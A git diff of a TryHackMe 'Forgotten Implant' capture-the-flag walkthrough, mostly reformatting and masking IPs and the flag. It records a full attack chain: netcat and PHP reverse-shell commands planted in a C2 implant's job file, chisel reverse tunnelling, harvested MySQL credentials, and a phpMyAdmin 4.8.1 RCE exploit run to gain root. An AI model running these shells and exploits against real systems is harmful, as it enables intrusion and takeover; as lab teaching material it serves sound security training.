@@ -1,115 +1,123 @@
-<p>2025, August 27</p>
-<h1>Forgotten Implant</h1>
+<h1 align="center">Forgotten Implant</h1>
+<p align="center">2025, September 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>490</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<em>Learn the methodology of enumerating websites by using tools such as Gobuster, Nikto and WPScan</em><br>
+<img width="80px" src="image" src=" "><br>
+Access this TryHackMe´s walkthrough <a href= ">here </a>.<br>
+<img width="1200px" src=" "></p>
 
 
 <h2>Task 1 . Forgotten Implant</h2>
 
 
+<h2>nmap</h2>
 
 ```bash
-:~# nmap -sT -p- 10.201.75.90
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-27 21:03 BST
-Nmap scan report for ip-10-201-75-90.ec2.internal (10.201.75.90)
-Host is up (0.00019s latency).
-Not shown: 65534 closed ports
+:~# nmap -sT -p- xx.xxx.xx.xx
+...
 PORT   STATE SERVICE
 22/tcp open  ssh
-MAC Address: 16:FF:F7:BE:F9:03 (Unknown)
-
-Nmap done: 1 IP address (1 host up) scanned in 2.77 seconds
 ```
 
-
-
+```bash
 :~# nc -nlvp 81
 Listening on 0.0.0.0 81
-Connection received on 10.201.75.90 40300
+Connection received on xx.xxx.xx.xx 40300
 GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1
-Host: 10.201.20.196:81
+Host: xx.xxx.xx.xxx:81
 User-Agent: python-requests/2.22.0
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: keep-alive
+```
 
-┌──(0xb0b㉿kali)-[~/Documents/tryhackme/forgotten implant/web]
-└─$ echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.201.92.59 4444 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
-
+```bash
+:~# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+```
 
 <img width="920" height="197" alt="image" src="https://github.com/user-attachments/assets/8f2e737f-275a-4be5-8910-687adbc57f36" />
 
+<br>
+<br>
 
-
+```bash
 :~# echo 'eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6Mjk6MDEuMzA5MTUxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0=' | base64 -d
-{"time": "2025-08-27T20:29:01.309151", "systeminfo": {"os": "Linux", "hostname": "ip-10-201-75-90"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
+{"time": "2025-xx-xxTxx:xx:xx1.xxxxxx", "systeminfo": {"os": "Linux", "hostname": "ip-xx-xxx-xx-xx"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
+```
 
-
-
-
+```bash
 :~# python3 -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
-10.201.75.90 - - [27/Aug/2025 21:32:02] code 404, message File not found
-10.201.75.90 - - [27/Aug/2025 21:32:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6MzI6MDIuMDA2MDMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
-10.201.75.90 - - [27/Aug/2025 21:32:03] code 404, message File not found
-10.201.75.90 - - [27/Aug/2025 21:32:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
-10.201.75.90 - - [27/Aug/2025 21:32:03] code 404, message File not found
-10.201.75.90 - - [27/Aug/2025 21:32:03] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMDgtMjdUMjA6MzI6MDIuMDA2MDMzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTIwMS03NS05MCJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] code 404, message File not found
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
+```
 
 <img width="1222" height="184" alt="image" src="https://github.com/user-attachments/assets/01bb144a-9a67-4338-b2f1-a43d978b95cb" />
 
 
+<br>
+<br>
 
-┌──(0xb0b㉿kali)-[~/Documents/tryhackme/forgotten implant/web]
-└─$ echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.201.68.75 4444 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+```bash
+:~# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
+```
 
-
+```bash
 :~# python3 -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 ...
-10.201.75.90 - - [27/Aug/2025 21:46:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
+xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
+```
 
-
-
+```bash
 :~# nc -nlvp 4444
 Listening on 0.0.0.0 4444
-Connection received on 10.201.75.90 52044
+Connection received on xx.xxx.xx.xx 52044
 bash: cannot set terminal process group (1364): Inappropriate ioctl for device
 bash: no job control in this shell
-ada@ip-10-201-75-90:~$ pwd
+ada@...:~$ pwd
 pwd
 /home/ada
-ada@ip-10-201-75-90:~$ id
+```
+
+``bash
+ada@...:~$ id
 id
 uid=1001(ada) gid=1001(ada) groups=1001(ada)
-ada@ip-10-201-75-90:~$ ls
+```
+
+```bash
+ada@...:~$ ls
 ls
 products.py
 user.txt
-ada@ip-10-201-75-90:~$ cat user.txt
+```
+
+```bash
+ada@...:~$ cat user.txt
 cat user.txt
-THM{902e8e8b1f49dfeb678e419935be23ef}
-ada@ip-10-201-75-90:~$ 
+THM{********************************}
+```
 
-
-
-
-da@ip-10-201-75-90:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```bash
+ada@...:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-ada@ip-10-201-75-90:~$ ^Z
+ada@...:~$ ^Z
 [1]+  Stopped                 nc -nlvp 4444
-root@ip-10-201-20-196:~# stty raw -echo && fg;
+:~# stty raw -echo && fg;
 nc -nlvp 4444
 
-ada@ip-10-201-75-90:~$ export TERM-xterm 
-bash: export: `TERM-xterm': not a valid identifier
-ada@ip-10-201-75-90:~$ export TERM=xterm
-ada@ip-10-201-75-90:~$ 
+ada@...:~$ export TERM=xterm
+```
 
-
-
-ada@ip-10-201-75-90:~$ ls -lah
+```bash
+ada@...:~$ ls -lah
 total 44K
 drwxr-xr-x 5 ada  ada  4.0K Mar 13  2023 .
-drwxr-xr-x 6 root root 4.0K Aug 27 20:02 ..
+drwxr-xr-x 6 root root 4.0K Sep 08  2025 ..
 lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
 -rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
 -rw-r--r-- 1 ada  ada  3.7K Jul 10  2022 .bashrc
@@ -121,7 +129,7 @@ drwxrwxr-x 4 ada  ada  4.0K Jul 12  2022 .local
 lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
 -rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
 -rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
-ada@ip-10-201-75-90:~$ cat products.py
+ada@...:~$ cat products.py
 import mysql.connector
 
 db = mysql.connector.connect(
@@ -136,19 +144,17 @@ cursor.execute('SELECT * FROM products')
 
 for product in cursor.fetchall():
     print(f'We have {product[2]}x {product[1]}')
-ada@ip-10-201-75-90:~$ 
+```
 
-
-
+```bash
  host='localhost', 
     database='app', 
 user = app
 password = s4Ucbrme
+```
 
-
-
-
-ada@ip-10-201-75-90:/home$ mysql -h localhost -u app -p
+```bash
+ada@...:/home$ mysql -h localhost -u app -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 11
@@ -199,30 +205,20 @@ mysql> select * from products;
 
 mysql> exit
 Bye
+```
 
+```bash
+ada@...:/tmp$ wget http://xx.xxx.xx.xxx:8888/nmap-x64.tar.gz -o nmap
+```
 
+```bash
+ada@...:/tmp$ tar -xzf nmap-x64.tar.gz
+```
 
-
-
-
-
-
-
-
-
-
-
-tar.gz10-201-75-90:/tmp$ wget http://10.201.20.196:8888/nmap-x64.tar.gz -o nmap
-
-
-
-ada@ip-10-201-75-90:/tmp$ tar -xzf nmap-x64.tar.gz
-
-
-
-ada@ip-10-201-75-90:/tmp$ ./nmap -sT -p- 127.0.01
-Starting Nmap 7.91 ( https://nmap.org ) at 2025-08-27 21:11 UTC
-Nmap scan report for 127.0.01 (127.0.0.1)
+```bash
+ada@...:/tmp$ ./nmap -sT -p- 127.0.0.1
+Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-xx xx:xx UTC
+Nmap scan report for 127.0.0.1 (127.0.0.1)
 Host is up (0.00014s latency).
 rDNS record for 127.0.0.1: localhost
 Not shown: 65531 closed ports
@@ -233,14 +229,10 @@ PORT      STATE SERVICE
 33060/tcp open  mysqlx
 
 Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
-ada@ip-10-201-75-90:/tmp$ 
+```
 
-
-
-
-
-
-ada@ip-10-201-75-90:~$ curl http://localhost:80/
+```bash
+ada@...:~$ curl http://localhost:80/
 <!DOCTYPE HTML><html lang='en' dir='ltr'><head><meta charset="utf-8" /><meta name="referrer" content="no-referrer" /><meta name="robots" content="noindex,nofollow" /><meta http-equiv="X-UA-Compatible" content="IE=Edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0"><style id="cfs-style">html{display: none;}</style><link rel="icon" href="favicon.ico" type="image/x-icon" /><link rel="shortcut icon" href="favicon.ico" type="image/x-icon" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/jquery/jquery-ui.css" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/lib/codemirror.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/hint/show-hint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/lint/lint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>
 <script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery-migrate.js?v=4.8.1"></script>
 <script data-cfasync='false' type='text/javascript' src='js/whitelist.php?v=4.8.1&amp;lang=en'></script>
@@ -284,10 +276,15 @@ AJAX.scriptHandler.add("vendor/jquery/jquery.min.js",0).add("vendor/jquery/jquer
 $(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.js");AJAX.fireOnload("keyhandler.js");AJAX.fireOnload("vendor/js.cookie.js");AJAX.fireOnload("menu-resizer.js");AJAX.fireOnload("rte.js");AJAX.fireOnload("vendor/tracekit.js");AJAX.fireOnload("error_report.js");AJAX.fireOnload("config.js");AJAX.fireOnload("doclinks.js");AJAX.fireOnload("functions.js");AJAX.fireOnload("navigation.js");AJAX.fireOnload("indexes.js");AJAX.fireOnload("common.js");AJAX.fireOnload("page_settings.js");AJAX.fireOnload("shortcuts_handler.js");AJAX.fireOnload("console.js");});
 // ]]></script><noscript><style>html{display:block}</style></noscript></head><body id='loginform'><div id="page_content"><div class="container">
 <a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F" target="_blank" rel="noopener noreferrer" class="logo">
+```    
+    
 <img src="./themes/pmahomme/img/logo_right.png" id="imLogo" name="imLogo" alt="phpMyAdmin" border="0" />
-</a>
+
+
 <h1>Welcome to <bdo dir="ltr" lang="en">phpMyAdmin</bdo></h1>
 
+
+```bash
 <noscript>
 <div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> Javascript must be enabled past this point!</div>
 </noscript>
@@ -309,45 +306,50 @@ $(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.j
                 <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
             </div>    <input type="hidden" name="server" value="1" /></fieldset><fieldset class="tblFooters"><input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value=";)pB/Sc^o8D}pw%?" /></fieldset>
     </form></div>
+``` 
 
+<br>
+<h2>chisel</h2>
 
-
-
+```bash
 :~# chisel server --reverse --port 1234
-2025/08/27 22:14:20 server: Reverse tunnelling enabled
-2025/08/27 22:14:20 server: Fingerprint R9KZw1WfMdiIEF9X6AKUOp7jJtxikqCAKR4yi104tD8=
-2025/08/27 22:14:20 server: Listening on http://0.0.0.0:1234
-2025/08/27 22:15:32 server: session#1: tun: proxy#R:5000=>80: Listening
+2025/09/xx xx:xx:xx server: Reverse tunnelling enabled
+2025/09/xx xx:xx:xx server: Fingerprint R9KZw1WfMdiIEF9X6AKUOp7jJtxikqCAKR4yi104tD8=
+2025/09/xx xx:xx:xx server: Listening on http://0.0.0.0:1234
+2025/09/xx xx:xx:xx server: session#1: tun: proxy#R:5000=>80: Listening
+``` 
 
-
-
-ada@ip-10-201-75-90:/tmp$ wget http://10.201.20.196:8888/chisel
---2025-08-27 21:13:43--  http://10.201.20.196:8888/chisel
-Connecting to 10.201.20.196:8888... connected.
+```bash
+ada@...:/tmp$ wget http://xx.xxx.xx.xxx:xxxx/chisel
+--2025-09-xx xx:xx:xx--  http://xx.xxx.xx.xxx:xxxx/chisel
+Connecting to xx.xxx.xx.xxx:xxxx... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 8339456 (8.0M) [application/octet-stream]
 Saving to: \u2018chisel\u2019
 
 chisel              100%[===================>]   7.95M  --.-KB/s    in 0.04s   
 
-2025-08-27 21:13:43 (182 MB/s) - \u2018chisel\u2019 saved [8339456/8339456]
+2025-09-xx xx:xx:xx (182 MB/s) - \u2018chisel\u2019 saved [8339456/8339456]
+``` 
 
-ada@ip-10-201-75-90:/tmp$ chmod +x chisel         
+```bash
+ada@...:/tmp$ chmod +x chisel  
+``` 
 
-0
-2025/08/27 21:15:31 client: Connecting to ws://10.201.20.196:123400:127.0.0.1:80 
-2025/08/27 21:15:31 client: Connected (Latency 677.193µs)
-
-
-
+```bash
+2025/09/xx xx:xx:xx client: Connecting to ws://xx.xxx.xx.xxx:123400:127.0.0.1:80 
+2025/09/xx xx:xx:xx client: Connected (Latency 677.193µs)
+``` 
 
 <img width="1325" height="448" alt="image" src="https://github.com/user-attachments/assets/859f1b52-d9a1-4ccc-a93c-a304c05d3f49" />
 
 <img width="1119" height="815" alt="image" src="https://github.com/user-attachments/assets/daebc076-bba7-4bb8-b6ce-6aedee8ad427" />
 
 
+<br>
+<br>
 
-
+```bash
 :~# python3 50457.py 127.0.0.1 5000 / app s4Ucbrme 'sudo -l'
 Start tag: html
 Start tag: body
@@ -356,20 +358,23 @@ Data: Hello, Rosana!
 End tag: h1
 End tag: body
 End tag: html
-Matching Defaults entries for www-data on ip-10-201-75-90:
+Matching Defaults entries for www-data on ip-xx-xxx-xx-xx:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User www-data may run the following commands on ip-10-201-75-90:
+User www-data may run the following commands on ip-xx-xxx-xx-xx:
     (root) NOPASSWD: /usr/bin/php
+``` 
 
 
+```bash
+"sudo php -r ‘$sock=fsockopen(xx.xxx.xx.xxx,xxxx);exec(“/bin/bash <&3 >&3 2>&3”);’"
+``` 
 
 
-"sudo php -r ‘$sock=fsockopen(10.201.20.196,7777);exec(“/bin/bash <&3 >&3 2>&3”);’"
+<br>
+<h2>CVE-2018-12613</h2>
 
-
-
-
+```bash
 :~# searchsploit phpmyadmin 4.8.1
 ---------------------------------------------- ---------------------------------
  Exploit Title                                |  Path
@@ -379,9 +384,9 @@ phpMyAdmin 4.8.1 - (Authenticated) Local File | php/webapps/44928.txt
 phpMyAdmin 4.8.1 - Remote Code Execution (RCE | php/webapps/50457.py
 ---------------------------------------------- ---------------------------------
 Shellcodes: No Results
+``` 
 
-
-
+```bash
 :~# searchsploit -m php/webapps/50457.py
   Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
       URL: https://www.exploit-db.com/exploits/50457
@@ -390,70 +395,29 @@ Shellcodes: No Results
  Verified: True
 File Type: Python script, ASCII text executable
 Copied to: /root/50457.py
+``` 
 
-
-
-
-
-da@ip-10-201-75-90:~$ getent hosts
+```bash
+ada@i...:~$ getent hosts
 127.0.0.1       localhost
 127.0.1.1       forgottenimplant
 127.0.0.1       ip6-localhost ip6-loopback
-ada@ip-10-201-75-90:~$ 
+``` 
 
-
-
-
-
-ada@ip-10-201-75-90:/home$ getent passwd
+```bash
+ada@...:/home$ getent passwd
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+...
 fi:x:1000:1000:fi:/home/fi:/bin/bash
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+...
 ada:x:1001:1001:,,,:/home/ada:/bin/bash
-mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
-fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+...
 ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
 ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
-ada@ip-10-201-75-90:/home$ 
+``` 
 
-
-
-
-
-
-
-ada@ip-10-201-75-90:~$ systemctl --type=service --state=running
+```bash
+ada@...:~$ systemctl --type=service --state=running
 UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                >
   accounts-daemon.service     loaded active running Accounts Service           >
   amazon-ssm-agent.service    loaded active running amazon-ssm-agent           >
@@ -461,20 +425,19 @@ UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                >
   atd.service                 loaded active running Deferred execution schedule>
   cron.service                loaded active running Regular background program >
   dbus.service                loaded active running D-Bus System Message Bus   
+``` 
 
-
-
-
-ada@ip-10-201-75-90:/var/www/phpmyadmin$ ls
+```bash
+ada@...:/var/www/phpmyadmin$ ls
 ajax.php                  robots.txt
 browse_foreigners.php     schema_export.php
 ChangeLog                 scripts
 changelog.php             server_binlog.php
+``` 
 
 
-
-
-da@ip-10-201-75-90:/var/www/phpmyadmin/scripts$ ls
+```bash
+ada@...:/var/www/phpmyadmin/scripts$ ls
 advisor2po            phpunit-top-tests
 create-release.sh     remove-incomplete-mo
 fix-po-twig           transformations_generator_main_class.sh
@@ -482,27 +445,27 @@ generate-mo           transformations_generator_plugin.sh
 generate-twig-cache   update-po
 lang-cleanup.sh       upload-release
 locales-contributors
+``` 
 
-
-
-ada@ip-10-201-75-90:/home$ ls
+```bash
+ada@...:/home$ ls
 ada  fi  ssm-user  ubuntu
-ada@ip-10-201-75-90:/home$ 
+```
 
-
-da@ip-10-201-75-90:~$ cd .implant
-ada@ip-10-201-75-90:~/.implant$ ls -lah
+```bash
+ada@...:~$ cd .implant
+ada@...:~/.implant$ ls -lah
 total 24K
-drwxrwxr-x 2 ada  ada  4.0K Aug 27 20:04 .
+drwxrwxr-x 2 ada  ada  4.0K Sep 08 20:04 .
 drwxr-xr-x 5 ada  ada  4.0K Mar 13  2023 ..
 -rw-rw-r-- 1 ada  ada  7.7K Aug 27 20:57 10.201.20.196.log
 -rw-r--r-- 1 root root   14 Aug 27 20:03 hosts
 -rw-rw-r-- 1 ada  ada  3.7K Mar 13  2023 implant.py
-ada@ip-10-201-75-90:~/.implant$ 
+``` 
 
 
-
-ada@ip-10-201-75-90:~/.implant$ cat implant.py
+```bash
+ada@...:~/.implant$ cat implant.py
 import base64
 import binascii
 import json
@@ -623,7 +586,7 @@ if __name__ == "__main__":
             time.sleep(1)
             commander.get_job()
             commander.save_log()
-ada@ip-10-201-75-90:~/.implant$ 
+``` 
 
 
 
